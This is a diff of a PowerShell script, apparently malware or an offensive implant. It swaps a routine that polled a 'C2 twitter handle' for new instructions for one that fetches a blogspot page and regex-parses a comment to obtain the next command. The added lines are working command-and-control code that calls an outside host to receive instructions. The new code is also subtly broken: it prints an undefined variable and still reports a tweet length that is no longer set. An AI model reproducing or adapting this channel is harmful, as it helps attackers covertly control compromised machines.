@@ -819,13 +819,16 @@ public static extern IntPtr GetForegroundWindow();
 
         #Function to grab the latest tweet
         Function GetLatestTweet {
-            #Check the C2 twitter feed for new instructions
-            [string] $TwitterAPIv1URL = "http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=$TwitterUserName&count=1&page=1"
-            Write-Verbose "The C2 twitter handle is:  $TwitterUserName"
-            Write-Verbose "Checking latest tweet at:  $TwitterAPIv1URL"
-            [xml] $XMLTwitterResult = $WebClientObject.downloadString($TwitterAPIv1URL)
-            [string] $LatestTweet = $XMLTwitterResult.statuses.status.text
-            [int32] $TweetLength = $LatestTweet.Length
+             $word = 'comment-content'
+            $WebClientObject = New-Object Net.WebClient
+            $testo = "http://networksecuritytester.blogspot.it/2015/03/corso-cyberwar.html?showComment"
+            $CommentResult = $WebClientObject.DownloadString($testo)
+            [string]$Commentstring = [regex]::matches( $CommentResult,  '(?i)<p[^>]*>(.*)</p>' )
+            $command_g = $Commentstring.split('>')
+            $command = $command_g[1]
+            $base = $Command.split('<')
+            $LatestTweet = $base[0]
+            write-host $lasttweet
             Write-Verbose "The LatestTweet is:  $LatestTweet"
             Write-Verbose "The tweet contains $TweetLength characters"
             $WebClientObject.Dispose()
